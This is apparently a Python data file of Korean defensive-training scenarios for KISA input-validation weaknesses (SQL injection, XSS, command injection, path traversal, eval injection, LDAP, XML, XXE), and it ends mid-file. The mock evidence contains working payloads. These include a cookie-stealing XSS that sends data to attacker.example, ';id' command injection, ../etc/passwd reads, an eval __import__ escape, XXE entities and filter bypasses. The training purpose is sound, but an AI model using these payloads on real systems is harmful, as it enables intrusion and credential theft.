# -*- coding: utf-8 -*-
"""KISA 49 보안약점 '현업 진단' 시나리오 — part 1 (입력값 검증 및 표현, 17종).

각 시나리오는 현업의 진단 흐름을 그대로 따른다.
  1) 접수 — 티켓은 "CWE-89를 고치세요"로 오지 않는다. 장애 보고·스캐너 리포트·VOC·모의해킹 결과로 온다.
  2) 증거 — 로그/스캔 상세/코드를 직접 열어 본다. 형식은 실제 도구 출력 형식을 따른다.
  3) 판정 — 정탐/오탐/추가확인. **정답이 항상 '정탐'이 아니다.**
  4) 조치 — 선택지에 '흔한 불완전 조치'를 섞는다. 고르면 왜 여전히 뚫리는지 재현 결과로 보여준다.

모든 로그·계정·호스트·IP 는 가상이다. 실행도 네트워크 호출도 없는 mock 이다.
"""


def S(key, ticket, evidence, verdict, fix, intro=None):
    d = {'ticket': ticket, 'evidence': evidence, 'verdict': verdict, 'fix': fix}
    if intro:
        d['intro'] = intro
    return (key, d)


def T(source, id, severity, sevLevel, body, note=None):
    t = {'source': source, 'id': id, 'severity': severity, 'sevLevel': sevLevel, 'body': body}
    if note:
        t['note'] = note
    return t


def E(icon, label, source, output):
    return {'icon': icon, 'label': label, 'source': source, 'output': output}


def V(answer, why, trap=None):
    v = {'answer': answer, 'why': why}
    if trap:
        v['trap'] = trap
    return v


def F(*options):
    return {'options': list(options)}


def O(label, ok, retest, why):
    return {'label': label, 'ok': ok, 'retest': retest, 'why': why}


SCENARIOS = dict([

# ───────────────────────────── SQL 삽입 ─────────────────────────────
S('sql_injection',
  T('운영팀 장애 보고', 'OPS-24817', '긴급', 'high',
    '새벽 2시 40분경 게시판 조회가 20초 이상 걸린다는 신고가 들어왔습니다. '
    'DB CPU 가 90% 를 넘겼고, 슬로우 쿼리에 보던 적 없는 형태의 SQL 이 찍혀 있습니다.\n'
    '개발팀은 "최근 배포한 것 없다"고 합니다.',
    '보안 이슈로 접수된 티켓이 아닙니다. 성능 장애로 들어왔고, 원인을 찾는 것은 진단자의 몫입니다.'),
  [
   E('🌐', '웹 서버 접근 로그', 'access.log',
     '$ tail -n 6 /var/log/nginx/access.log | grep "/board"\n'
     '203.0.113.77 - - [12/Sep/2026:02:38:11 +0900] "GET /board?gubun=notice HTTP/1.1" 200 4821\n'
     '203.0.113.77 - - [12/Sep/2026:02:38:44 +0900] "GET /board?gubun=notice%27 HTTP/1.1" 500 1120\n'
     '203.0.113.77 - - [12/Sep/2026:02:39:02 +0900] "GET /board?gubun=notice%27%20AND%201%3D1--%20 HTTP/1.1" 200 4821\n'
     '203.0.113.77 - - [12/Sep/2026:02:39:20 +0900] "GET /board?gubun=notice%27%20AND%201%3D2--%20 HTTP/1.1" 200 312\n'
     '203.0.113.77 - - [12/Sep/2026:02:40:05 +0900] "GET /board?gubun=notice%27%20AND%20SLEEP(5)--%20 HTTP/1.1" 200 4821\n'
     '203.0.113.77 - - [12/Sep/2026:02:41:33 +0900] "GET /board?gubun=notice%27%20UNION%20SELECT%20... HTTP/1.1" 200 88214'),
   E('🗄️', 'DB 슬로우 쿼리 로그', 'mysql-slow.log',
     '$ tail -n 8 /var/log/mysql/mysql-slow.log\n'
     '# Query_time: 5.002  Lock_time: 0.000  Rows_sent: 42  Rows_examined: 42\n'
     "SELECT * FROM board WHERE b_gubun = 'notice' AND SLEEP(5)-- ';\n"
     '# Query_time: 0.041  Lock_time: 0.000  Rows_sent: 1204  Rows_examined: 9841\n'
     "SELECT * FROM board WHERE b_gubun = 'notice' UNION SELECT user_id,user_pw,email,1,2 FROM members-- ';"),
   E('🔍', 'SAST 스캔 상세', 'semgrep',
     '$ semgrep --config p/java --json | jq -r \'.results[] | "\\(.check_id) \\(.path):\\(.start.line)"\'\n'
     'java.lang.security.audit.sqli.jdbc-sqli  src/main/java/board/BoardDao.java:57\n'
     '\n'
     '--- BoardDao.java:52-58 ---\n'
     '  String gubun = request.getParameter("gubun");\n'
     '  String sql = "SELECT * FROM board WHERE b_gubun = \'" + gubun + "\'";\n'
     '  Statement stmt = con.createStatement();\n'
     '  ResultSet rs = stmt.executeQuery(sql);   // <== 여기'),
   E('🧱', 'WAF 이벤트', 'modsecurity',
     '$ grep 203.0.113.77 /var/log/modsec_audit.log | tail -3\n'
     '[12/Sep/2026:02:39:02] ModSecurity: Warning. Pattern match "union.*select" at ARGS:gubun\n'
     '  [id "942100"] [severity "CRITICAL"] [action "pass"]\n'
     'WARNING: 엔진 모드 = DetectionOnly (탐지만, 차단하지 않음)'),
  ],
  V('true',
    'Rows_examined 가 9,841건인 UNION 쿼리가 실제로 실행되어 members 테이블의 계정·비밀번호가 조회됐습니다. '
    '문자열 연결로 만든 SQL 에 외부 입력이 그대로 들어갔고, WAF 는 탐지 전용 모드라 막지 못했습니다. 정탐이며 이미 유출이 발생한 상태입니다.',
    'SLEEP(5) 응답 지연만 보고 "가능성"으로 보고하면 늦습니다. UNION 응답 크기(88,214바이트)와 Rows_sent 1,204 가 실제 유출의 증거입니다.'),
  F(
   O('WAF 를 차단(Blocking) 모드로 전환한다', False,
     "$ curl 'https://app/board?gubun=notice%27%2f**%2fUNION%2f**%2fSELECT...'\n"
     'HTTP/1.1 200 OK   (길이 88214)\n'
     '>> 주석 우회로 시그니처 미탐 — 동일 데이터 유출됨',
     'WAF 는 시간을 버는 보완통제이지 조치가 아닙니다. 인라인 주석·인코딩 변형으로 시그니처는 우회됩니다. 코드를 고치기 전까지 구멍은 그대로입니다.'),
   O("작은따옴표(')를 제거하거나 두 번 겹쳐 치환한다", False,
     "$ curl 'https://app/board?gubun=notice%5C%27%20OR%201%3D1--%20'\n"
     'HTTP/1.1 200 OK   (전체 행 반환)\n'
     '>> 역슬래시 이스케이프 조합으로 필터 우회',
     '블랙리스트 치환은 인코딩·이스케이프 조합 앞에서 무너집니다. 숫자형 컬럼에는 따옴표 없이도 주입됩니다.'),
   O('PreparedStatement 로 바꾸고 파라미터를 바인딩한다', True,
     "$ curl 'https://app/board?gubun=notice%27%20UNION%20SELECT...'\n"
     'HTTP/1.1 200 OK   (길이 312, 결과 0건)\n'
     '>> 입력 전체가 하나의 문자열 값으로 취급됨 — 구문으로 해석되지 않음\n'
     '$ semgrep --config p/java  →  0 findings',
     '값과 구문을 분리하는 것이 유일한 근본 조치입니다. 바인딩된 파라미터는 아무리 SQL 처럼 생겨도 데이터일 뿐입니다.'))),

# ───────────────────────────── XSS ─────────────────────────────
S('xss',
  T('고객 문의(VOC)', 'VOC-7731', '높음', 'high',
    '"고객센터 문의 내역을 보는데 갑자기 로그아웃되고, 다른 사이트 광고창이 떴다"는 문의가 3건 접수됐습니다.\n'
    '해당 사용자들은 모두 같은 문의 게시글을 열람했습니다.',
    '사용자는 "해킹당했다"고 말하지 않습니다. "이상하다"고 말합니다.'),
  [
   E('🗃️', '해당 게시글 원문 (DB 저장값)', 'inquiry 테이블',
     '$ mysql -e "SELECT content FROM inquiry WHERE id=88213\\G"\n'
     'content: 배송이 너무 늦어요<img src=x onerror="new Image().src=\n'
     '         \'https://attacker.example/c?\'+document.cookie">\n'
     '\n'
     '>> 태그가 이스케이프되지 않은 원문 그대로 저장되어 있음'),
   E('📤', '외부 통신 로그', 'egress proxy',
     '$ grep attacker.example /var/log/squid/access.log | wc -l\n'
     '17\n'
     '$ grep attacker.example /var/log/squid/access.log | head -2\n'
     '[12/Sep/2026:10:02:44] 10.0.4.21 GET https://attacker.example/c?JSESSIONID=9F2A...  200\n'
     '[12/Sep/2026:10:07:12] 10.0.4.38 GET https://attacker.example/c?JSESSIONID=B71C...  200'),
   E('🔍', '템플릿 코드', 'inquiry_view.jsp',
     '$ sed -n \'40,44p\' webapp/inquiry_view.jsp\n'
     '  <div class="content">\n'
     '    <%= inquiry.getContent() %>          <!-- 이스케이프 없음 -->\n'
     '  </div>\n'
     '\n'
     '$ grep -rn "HttpOnly" webapp/WEB-INF/web.xml\n'
     '(결과 없음)'),
  ],
  V('true',
    '저장된 스크립트가 열람자 브라우저에서 실행되어 세션 쿠키가 외부로 17건 전송됐습니다. '
    '출력 시 이스케이프가 없고 쿠키에 HttpOnly 도 없어 탈취가 성립했습니다. 저장형 XSS 정탐이며 세션 탈취까지 발생했습니다.',
    '"입력할 때 필터링하겠다"로 끝내면 이미 DB 에 저장된 88213번 글은 계속 터집니다. 조치에는 저장된 데이터 정리가 반드시 포함돼야 합니다.'),
  F(
   O('입력 시점에 <script> 태그를 제거한다', False,
     '$ POST /inquiry  content=<img src=x onerror=alert(1)>\n'
     '>> 저장 성공 — <script> 가 아니므로 필터 통과\n'
     '>> 열람 시 그대로 실행됨',
     'XSS 는 <script> 만으로 발생하지 않습니다. onerror·onload 등 이벤트 핸들러, javascript: URL 등 경로가 많아 블랙리스트로는 막지 못합니다.'),
   O('출력 시 HTML 이스케이프 + 쿠키 HttpOnly·SameSite 적용', True,
     '$ curl https://app/inquiry/88213 | grep -o "&lt;img.*&gt;"\n'
     '&lt;img src=x onerror=...&gt;      (문자로 출력됨 — 실행 안 됨)\n'
     '$ curl -I https://app/login\n'
     'Set-Cookie: JSESSIONID=...; HttpOnly; Secure; SameSite=Lax\n'
     '>> 저장된 페이로드도 무해화되고, 설령 실행돼도 쿠키 접근 불가',
     '출력 맥락에서 이스케이프하는 것이 근본 조치입니다. HttpOnly 는 그것이 실패했을 때를 대비한 두 번째 방어선입니다.'),
   O('WAF 에 XSS 룰셋을 추가한다', False,
     '$ POST /inquiry  content=<img src=x onerror=eval(atob("YWxlcnQoMSk="))>\n'
     '>> 인코딩된 페이로드 — 시그니처 미탐, 저장 및 실행됨',
     '입력 경로가 웹 폼만이 아닙니다. API·배치·관리자 화면으로도 데이터가 들어오며, WAF 는 그 경로를 다 보지 못합니다.'))),

# ───────────────────────────── OS 명령어 삽입 ─────────────────────────────
S('os_command',
  T('모의해킹 보고서', 'PT-2026-041', '긴급', 'high',
    '외부 모의해킹에서 "관리자 페이지의 네트워크 점검 기능을 통해 서버 임의 명령 실행이 가능하다"는 지적을 받았습니다.\n'
    '개발팀 회신: "관리자만 쓰는 기능이고, IP 형식 검사를 이미 하고 있습니다."',
    '개발팀의 반론이 타당한지까지 확인하는 것이 진단입니다.'),
  [
   E('💻', 'PoC 재현', '점검 서버',
     '$ curl -u admin:*** "https://app/admin/nettest?host=8.8.8.8;id"\n'
     'PING 8.8.8.8: 56 data bytes\n'
     '64 bytes from 8.8.8.8: icmp_seq=0 ttl=117 time=32.1 ms\n'
     'uid=0(root) gid=0(root) groups=0(root)\n'
     '\n'
     '>> ping 출력 뒤에 id 명령 결과가 이어짐 — root 권한으로 실행됨'),
   E('🔍', '해당 코드', 'NetTestController.java',
     '$ sed -n \'31,38p\' src/main/java/admin/NetTestController.java\n'
     '  String host = request.getParameter("host");\n'
     '  if (!host.matches("^[0-9.;|&a-zA-Z-]+$")) {   // 형식 검사라고 주장한 부분\n'
     '      throw new IllegalArgumentException();\n'
     '  }\n'
     '  Process p = Runtime.getRuntime().exec("/bin/sh -c ping -c1 " + host);\n'
     '\n'
     '>> 정규식에 ; | & 가 허용 문자로 들어가 있음'),
   E('👤', '관리자 계정 현황', 'IAM',
     '$ ./iam-report.sh --role admin\n'
     'admin        마지막 로그인 2026-09-11   MFA: 미설정\n'
     'op_batch     마지막 로그인 2026-09-12   MFA: 미설정   (공용 계정, 협력사 3인 공유)\n'
     'dev_temp     마지막 로그인 2025-11-02   MFA: 미설정   (퇴사자 계정, 미말소)\n'
     '\n'
     '>> 관리자 권한 보유 8계정 중 MFA 적용 0건'),
  ],
  V('true',
    'PoC 로 root 권한 임의 명령 실행이 실제 재현됐습니다. "IP 형식 검사를 한다"는 반론은 성립하지 않습니다 — '
    '정규식 문자 클래스에 ; | & 가 허용 문자로 포함돼 있어 검사를 통과합니다. '
    '게다가 관리자 계정은 공용·퇴사자 계정이 섞여 있고 MFA 도 없어 "관리자만 쓴다"는 전제도 약합니다.',
    '"검증하고 있다"는 말을 코드 확인 없이 받아들이면 안 됩니다. 검증의 존재가 아니라 검증의 내용을 봐야 합니다.'),
  F(
   O('정규식에서 ; | & 문자를 제거한다', False,
     '$ curl "https://app/admin/nettest?host=8.8.8.8%0Aid"\n'
     'PING 8.8.8.8 ...\n'
     'uid=0(root) ...\n'
     '>> 개행문자(%0A)로 우회 — 여전히 실행됨',
     '금지 문자를 지우는 방식은 늘 빠진 문자가 있습니다. 개행·백틱·$() 등 셸 메타문자는 계속 나옵니다.'),
   O('셸을 거치지 않고 인자 배열로 실행 + 화이트리스트 검증', True,
     '$ curl "https://app/admin/nettest?host=8.8.8.8;id"\n'
     'HTTP/1.1 400 Bad Request\n'
     '{"error":"host 형식이 올바르지 않습니다"}\n'
     '$ curl "https://app/admin/nettest?host=8.8.8.8"\n'
     '64 bytes from 8.8.8.8: icmp_seq=0 ttl=117 time=32.1 ms\n'
     '>> ProcessBuilder(["ping","-c1",host]) — 셸 해석 자체가 없음',
     '셸을 거치지 않으면 메타문자가 의미를 잃습니다. 여기에 IP 형식 화이트리스트를 더해 입력 자체를 좁힙니다.'),
   O('해당 기능을 관리자 IP 대역에서만 접근하도록 제한한다', False,
     '$ curl --interface 10.0.2.15 "https://app/admin/nettest?host=8.8.8.8;id"\n'
     'uid=0(root) ...\n'
     '>> 내부망 단말을 경유하면 그대로 실행 — 내부자·침해 단말에 무방비',
     '접근 통제는 보완통제입니다. 명령 실행 경로 자체가 남아 있으면 내부망에 들어온 공격자에게는 아무 장애물이 아닙니다.'))),

# ───────────────────────────── 경로 조작 ─────────────────────────────
S('path_traversal',
  T('SAST 스캐너 리포트', 'SONAR-3312', '높음', 'high',
    'SonarQube 야간 스캔에서 첨부파일 다운로드 기능에 경로 조작(CWE-22) 이슈가 올라왔습니다.\n'
    '해당 코드는 3년 전 작성됐고 그동안 스캔에 잡히지 않았습니다(룰셋 갱신으로 신규 탐지).',
    '"예전부터 있던 코드"라는 사실은 안전하다는 근거가 아닙니다.'),
  [
   E('🔍', '스캔 상세', 'sonarqube',
     '$ sonar-issue --key S2083 --component FileDownload.java\n'
     'severity: BLOCKER   rule: S2083 (Path traversal)\n'
     'FileDownload.java:44\n'
     '  String name = request.getParameter("file");\n'
     '  File f = new File("/app/upload/" + name);\n'
     '  response.getOutputStream().write(Files.readAllBytes(f.toPath()));'),
   E('💻', 'PoC 재현', '점검 서버',
     '$ curl "https://app/download?file=../../../../etc/passwd" -o out.txt\n'
     '$ head -2 out.txt\n'
     'root:x:0:0:root:/root:/bin/bash\n'
     'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n'
     '\n'
     '$ curl "https://app/download?file=../../../app/config/application.yml"\n'
     'spring.datasource.password: Pr0d!Db#2026'),
   E('🌐', '접근 로그 소급 조회 (최근 90일)', 'access.log',
     '$ zgrep -c "file=\\.\\./" /var/log/nginx/access.log-*.gz\n'
     '0\n'
     '$ zgrep -c "file=%2e%2e" /var/log/nginx/access.log-*.gz\n'
     '0\n'
     '>> 외부에서 실제로 시도된 흔적은 없음'),
  ],
  V('true',
    'PoC 에서 /etc/passwd 와 운영 DB 비밀번호가 담긴 설정 파일까지 읽혔습니다. 악용 가능성이 실증됐으므로 정탐입니다. '
    '접근 로그에 시도 흔적이 없다는 것은 "아직 당하지 않았다"는 뜻이지 "취약하지 않다"는 뜻이 아닙니다.',
    '로그에 공격 흔적이 없다고 오탐 처리하는 실수가 잦습니다. 로그는 과거를 말할 뿐 구조적 결함의 존재 여부와 무관합니다.'),
  F(
   O('입력값에서 "../" 문자열을 제거한다', False,
     '$ curl "https://app/download?file=....//....//etc/passwd"\n'
     'root:x:0:0:root:/root:/bin/bash\n'
     '>> "../" 를 한 번 제거하면 "....//" 가 "../" 로 남음 — 우회 성립',
     '치환은 치환 후의 결과를 다시 검사하지 않습니다. URL 인코딩·유니코드 변형도 남습니다.'),
   O('정규화한 절대경로가 허용 디렉터리 하위인지 검사한다', True,
     '$ curl "https://app/download?file=../../../../etc/passwd"\n'
     'HTTP/1.1 400 Bad Request\n'
     '{"error":"허용되지 않은 경로"}\n'
     '\n'
     '// canonical path 로 정규화한 뒤 시작 경로 비교\n'
     'Path base = Paths.get("/app/upload").toRealPath();\n'
     'Path target = base.resolve(name).normalize().toRealPath();\n'
     'if (!target.startsWith(base)) throw new SecurityException();',
     '정규화 후에 판단하는 것이 핵심입니다. 문자열을 보지 말고 최종적으로 가리키는 실제 경로를 봐야 합니다. 심볼릭 링크까지 풀어야 합니다.'),
   O('업로드 디렉터리의 파일 권한을 읽기 전용으로 바꾼다', False,
     '$ curl "https://app/download?file=../../../etc/passwd"\n'
     'root:x:0:0:root:/root:/bin/bash\n'
     '>> 읽기 공격이므로 권한 변경과 무관 — 그대로 유출',
     '이 약점은 쓰기가 아니라 읽기 경로의 문제입니다. 대상 디렉터리 권한을 바꿔도 다른 경로를 읽는 것을 막지 못합니다.'))),

# ───────────────────────────── 코드 삽입 ─────────────────────────────
S('codeinjection',
  T('보안팀 정기 진단', 'SEC-1180', '높음', 'high',
    '리포트 서식 기능에서 사용자가 입력한 "계산식"을 서버가 평가해 결과를 보여줍니다.\n'
    '스캐너가 동적 코드 실행(CWE-94)으로 지적했습니다. 기획팀은 "엑셀 수식처럼 쓰는 편의 기능"이라고 설명합니다.',
    '편의 기능이라는 설명과 위험도는 별개입니다.'),
  [
   E('🔍', '해당 코드', 'report_formula.py',
     '$ sed -n \'22,27p\' app/report_formula.py\n'
     '  formula = request.POST.get("formula")   # 예: "qty * price * 1.1"\n'
     '  ctx = {"qty": row.qty, "price": row.price}\n'
     '  result = eval(formula, {}, ctx)          # <== 스캐너 지적 지점\n'
     '  return JsonResponse({"result": result})'),
   E('💻', 'PoC 재현', '점검 서버',
     '$ curl -X POST https://app/report/calc -d \'formula=__import__("os").popen("id").read()\'\n'
     '{"result":"uid=1000(appsvc) gid=1000(appsvc)\\n"}\n'
     '\n'
     '$ curl -X POST https://app/report/calc -d \'formula=open("/app/.env").read()\'\n'
     '{"result":"DB_PASSWORD=Pr0d!Db#2026\\nSECRET_KEY=..."}'),
   E('👥', '접근 권한 확인', 'RBAC',
     '$ ./rbac-check.sh --endpoint /report/calc\n'
     'required_role: (없음)\n'
     'authenticated: false\n'
     '>> 로그인 없이 호출 가능한 공개 엔드포인트'),
  ],
  V('true',
    'eval 에 빈 globals 를 넘겨 제한했다고 보이지만 __import__ 로 우회되어 임의 코드가 실행됐고, '
    '운영 DB 비밀번호까지 읽혔습니다. 게다가 인증조차 필요 없는 공개 엔드포인트입니다. 정탐이며 위험도는 리포트의 "높음"보다 더 올려야 합니다.',
    'eval 의 globals 를 비우면 안전하다고 오해하기 쉽습니다. 내장 함수 접근 경로가 여러 개라 샌드박스로 성립하지 않습니다.'),
  F(
   O('eval 에 넘기는 globals 에서 위험한 이름을 블랙리스트로 막는다', False,
     '$ curl -X POST https://app/report/calc -d \'formula=().__class__.__bases__[0].__subclasses__()\'\n'
     '{"result":"[<class \'type\'>, <class \'weakref\'>, ...]"}\n'
     '>> 객체 그래프를 타고 우회 — 블랙리스트 무력화',
     '파이썬 객체 그래프를 통한 우회 경로가 매우 많아 블랙리스트 샌드박스는 실패가 기본값입니다.'),
   O('연산자와 숫자만 허용하는 전용 수식 파서를 쓴다', True,
     '$ curl -X POST https://app/report/calc -d \'formula=__import__("os").popen("id").read()\'\n'
     'HTTP/1.1 400 Bad Request\n'
     '{"error":"허용되지 않은 토큰: __import__"}\n'
     '$ curl -X POST https://app/report/calc -d \'formula=qty * price * 1.1\'\n'
     '{"result": 34320.0}\n'
     '>> 화이트리스트 기반 AST 검증 — 함수 호출 노드 자체를 거부',
     '코드를 실행하지 않고 수식만 해석하면 위험 자체가 사라집니다. 기획 요구(수식 계산)는 그대로 충족됩니다.'),
   O('엔드포인트에 로그인 인증을 추가한다', False,
     '$ curl -b "session=<로그인 쿠키>" -X POST https://app/report/calc -d \'formula=open("/app/.env").read()\'\n'
     '{"result":"DB_PASSWORD=Pr0d!Db#2026..."}\n'
     '>> 인증된 일반 사용자도 서버 파일을 읽음',
     '인증은 공격자의 범위를 좁힐 뿐입니다. 로그인한 사용자 누구나 서버를 장악할 수 있는 상태가 남습니다.'))),

# ───────────────────────────── LDAP 삽입 ─────────────────────────────
S('ldap_injection',
  T('보안팀 정기 진단', 'SEC-1204', '중간', 'mid',
    '사내 임직원 검색 기능에서 LDAP 필터에 입력값이 그대로 들어간다는 지적입니다.\n'
    '개발팀 회신: "사내망에서만 접근 가능하고, 조회 전용 계정이라 위험하지 않습니다."'),
  [
   E('🔍', '해당 코드', 'DirectorySearch.java',
     '$ sed -n \'28,33p\' src/main/java/hr/DirectorySearch.java\n'
     '  String name = request.getParameter("name");\n'
     '  String filter = "(&(objectClass=person)(cn=" + name + "))";\n'
     '  NamingEnumeration<SearchResult> r = ctx.search("ou=people,dc=corp", filter, sc);'),
   E('💻', 'PoC 재현', '점검 서버',
     '$ curl "https://intra/hr/search?name=*"\n'
     '>> 전 임직원 1,842명 반환 (이름·부서·직급·내선·이메일·사번)\n'
     '\n'
     "$ curl \"https://intra/hr/search?name=*)(userPassword=*\"\n"
     '>> 속성 필터 조작 성공 — userPassword 속성 보유 계정 열거됨'),
   E('🔑', '바인드 계정 권한', 'LDAP ACL',
     '$ ldapsearch -D "cn=app-reader,dc=corp" -W -b "dc=corp" "(cn=*)" | head -5\n'
     'dn: cn=hong,ou=people,dc=corp\n'
     'cn: hong\n'
     'employeeNumber: 20180417\n'
     'mobile: 010-****-1234\n'
     '\n'
     '$ ./ldap-acl.sh app-reader\n'
     'read: ou=people (전체 속성)   write: (없음)'),
  ],
  V('true',
    '필터 메타문자가 그대로 전달되어 조회 범위 제한이 무력화됐습니다. 조회 전용 계정이라 변조는 없지만, '
    '전 임직원 개인정보 1,842건이 인증 없이 열거됩니다. 개인정보 대량 조회가 성립하므로 정탐입니다.',
    '"조회 전용이라 안전하다"는 반론이 흔합니다. 쓰기 권한이 없어도 대량 열람 자체가 개인정보 침해입니다.'),
  F(
   O('입력값에서 괄호와 별표를 제거한다', False,
     '$ curl "https://intra/hr/search?name=%5c2a"\n'
     '>> 전 임직원 반환 — 인코딩된 형태로 필터에 도달',
     '문자 제거는 인코딩 변형을 놓칩니다. LDAP 은 이스케이프 규칙이 별도로 정의돼 있어 직접 구현하면 빠지는 경우가 생깁니다.'),
   O('LDAP 이스케이프 API 적용 + 조회 결과 건수 제한·감사 로그', True,
     '$ curl "https://intra/hr/search?name=*"\n'
     '>> 0건 (이름이 정확히 "*" 인 사람 없음)\n'
     "$ curl \"https://intra/hr/search?name=*)(userPassword=*\"\n"
     '>> 0건 — 메타문자가 리터럴로 이스케이프됨\n'
     '$ tail -1 /var/log/app/hr-audit.log\n'
     '[12/Sep 14:22] user=kim query="*" results=0 ALLOW',
     '표준 이스케이프 API 를 쓰고, 여기에 결과 건수 제한과 감사 로그를 더해 대량 조회 자체를 탐지 가능하게 만듭니다.'),
   O('해당 기능을 인사팀 부서 코드 보유자만 쓰게 제한한다', False,
     '$ curl -b "session=<인사팀 계정>" "https://intra/hr/search?name=*"\n'
     '>> 전 임직원 1,842명 반환',
     '권한 축소는 노출 범위를 줄이지만 필터 주입 자체는 남습니다. 인사팀 계정 하나가 침해되면 동일합니다.'))),

# ───────────────────────────── XML 삽입 ─────────────────────────────
S('xml',
  T('연계 기관 장애 보고', 'OPS-24990', '중간', 'mid',
    '제휴사 주문 연계에서 간헐적으로 "주문 수량이 이상하다"는 정산 불일치가 발생합니다.\n'
    '개발팀은 "제휴사가 잘못 보낸 것 같다"고 합니다.'),
  [
   E('📄', '수신 XML 원문', 'edi-inbound.log',
     '$ grep -A6 "ORD-88213" /var/log/app/edi-inbound.log\n'
     '<order>\n'
     '  <item>노트북</item>\n'
     '  <qty>1</qty>\n'
     '  <memo>선물포장</memo></order><order><item>노트북</item><qty>50</qty><memo>x</memo>\n'
     '  </order>\n'
     '>> memo 필드 값에 닫는 태그가 섞여 들어와 주문 요소가 2개로 분리됨'),
   E('🔍', 'XML 생성 코드', 'OrderXmlBuilder.java',
     '$ sed -n \'19,24p\' src/main/java/edi/OrderXmlBuilder.java\n'
     '  StringBuilder sb = new StringBuilder();\n'
     '  sb.append("<order>");\n'
     '  sb.append("<item>").append(item).append("</item>");\n'
     '  sb.append("<qty>").append(qty).append("</qty>");\n'
     '  sb.append("<memo>").append(memo).append("</memo>");   // 이스케이프 없음\n'
     '  sb.append("</order>");'),
   E('💰', '정산 차이 내역', '정산 시스템',
     '$ ./settle-diff.sh --period 2026-09\n'
     '건수 차이: 주문 12건 / 출고 12건 / 청구 12건\n'
     '금액 차이: -18,400,000원 (청구 누락)\n'
     '>> 분리된 두 번째 <order> 가 출고는 되었으나 청구 대상에서 누락'),
  ],
  V('true',
    '입력값이 이스케이프 없이 XML 문서에 삽입되어 문서 구조 자체가 조작됐습니다. '
    '단순 오류가 아니라 수량·금액 변조가 가능한 구조이며, 실제로 1,840만원 청구 누락이 발생했습니다. 정탐입니다.',
    '"제휴사가 잘못 보냈다"로 닫으면 안 됩니다. 어떤 값이 오더라도 문서 구조가 깨지지 않게 만드는 것은 수신 측 책임입니다.'),
  F(
   O('memo 필드 길이를 30자로 제한한다', False,
     '<memo>a</memo><qty>99</qty><memo>b</memo>\n'
     '>> 30자 안에서도 구조 조작 가능 — 수량 변조 성립',
     '길이 제한은 공격 난이도만 올립니다. 짧은 페이로드로도 태그를 닫고 여는 데 충분합니다.'),
   O('XML 라이브러리(DOM/JAXB)로 문서를 조립한다', True,
     '<memo>선물포장&lt;/memo&gt;&lt;/order&gt;&lt;order&gt;...</memo>\n'
     '>> 특수문자가 엔티티로 자동 이스케이프됨 — 요소는 1개 유지\n'
     '$ ./settle-diff.sh --period 2026-09  →  금액 차이 0원',
     '문자열을 이어 붙이지 않고 라이브러리가 문서를 만들게 하면 이스케이프가 자동으로 보장됩니다.'),
   O('수신 XML 을 스키마(XSD)로 검증한다', False,
     '<order><item>노트북</item><qty>50</qty><memo>x</memo></order>\n'
     '>> 스키마상 완벽히 유효한 문서 — 검증 통과, 변조 그대로',
     '조작된 결과물도 문법적으로는 정상 XML 입니다. 스키마 검증은 유용하지만 이 문제를 잡지 못합니다.'))),

# ───────────────────────────── XXE ─────────────────────────────
S('xxe',
  T('SAST 스캐너 리포트', 'SONAR-3390', '높음', 'high',
    '전자문서 업로드 모듈에서 XXE(CWE-611) 가 탐지됐습니다.\n'
    '개발팀 회신: "Java 17 최신 런타임이라 기본값이 안전합니다."'),
  [
   E('🔍', '파서 설정 코드', 'DocParser.java',
     '$ sed -n \'14,20p\' src/main/java/doc/DocParser.java\n'
     '  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n'
     '  // 외부 개체 관련 설정 없음\n'
     '  DocumentBuilder db = dbf.newDocumentBuilder();\n'
     '  Document doc = db.parse(uploadedFile.getInputStream());\n'
     '\n'
     '$ grep -rn "FEATURE_SECURE_PROCESSING\\|disallow-doctype-decl" src/\n'
     '(결과 없음)'),
   E('💻', 'PoC 재현', '점검 서버',
     '$ cat poc.xml\n'
     '<?xml version="1.0"?>\n'
     '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>\n'
     '<doc><title>&x;</title></doc>\n'
     '\n'
     '$ curl -F file=@poc.xml https://app/doc/upload\n'
     '{"title":"root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:..."}\n'
     '>> 서버 로컬 파일이 응답에 그대로 반환됨'),
   E('☁️', '메타데이터 접근 시도', '점검 서버',
     '$ cat poc2.xml\n'
     '<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>\n'
     '\n'
     '$ curl -F file=@poc2.xml https://app/doc/upload\n'
     '{"title":""}\n'
     '>> 빈 값 — IMDSv2 적용으로 토큰 없는 요청은 거부됨'),
  ],
  V('true',
    '로컬 파일 읽기가 실제로 재현됐습니다. "최신 런타임이라 안전하다"는 반론은 틀렸습니다 — '
    'DocumentBuilderFactory 는 기본적으로 외부 개체를 허용하며 명시적으로 꺼야 합니다. '
    '클라우드 자격증명 탈취는 IMDSv2 덕분에 막혔지만, 파일 읽기만으로도 정탐입니다.',
    'IMDSv2 가 막아 줬다는 이유로 위험도를 낮추면 안 됩니다. 그것은 다른 계층의 통제이고, 파서 자체는 여전히 열려 있습니다.'),
  F(
   O('업로드 파일 확장자를 .xml 로만 제한한다', False,
     '$ curl -F file=@poc.xml https://app/doc/upload\n'
     '{"title":"root:x:0:0:..."}\n'
     '>> 확장자는 정상 — 아무 영향 없음',
     '확장자 검사는 파일 형식을 확인할 뿐 파서 설정과 무관합니다.'),
   O('DOCTYPE 선언 자체를 금지하도록 파서를 설정한다', True,
     '$ curl -F file=@poc.xml https://app/doc/upload\n'
     'HTTP/1.1 400 Bad Request\n'
     '{"error":"DOCTYPE is disallowed"}\n'
     '\n'
     'dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\n'
     'dbf.setXIncludeAware(false);\n'
     'dbf.setExpandEntityReferences(false);',
     'DTD 자체를 막는 것이 가장 확실합니다. 외부 개체 옵션을 하나씩 끄는 방식은 파서 구현마다 빠지는 옵션이 생깁니다.'),
   O('업로드된 XML 에서 "SYSTEM" 문자열을 검사해 거부한다', False,
     '$ cat poc3.xml\n'
     '<!DOCTYPE r [<!ENTITY % a SYSTEM "http://attacker/x.dtd"> %a;]>\n'
     '   (파라미터 개체 + 대소문자 변형 + 인코딩 조합)\n'
     '>> 문자열 검사 우회 — 외부 DTD 로딩 성립',
     '파싱 전에 문자열로 검사하는 접근은 인코딩·파라미터 개체 조합으로 우회됩니다. 파서 설정으로 막아야 합니다.'))),

# ───────────────────────────── SSRF ─────────────────────────────
S('ssrf',
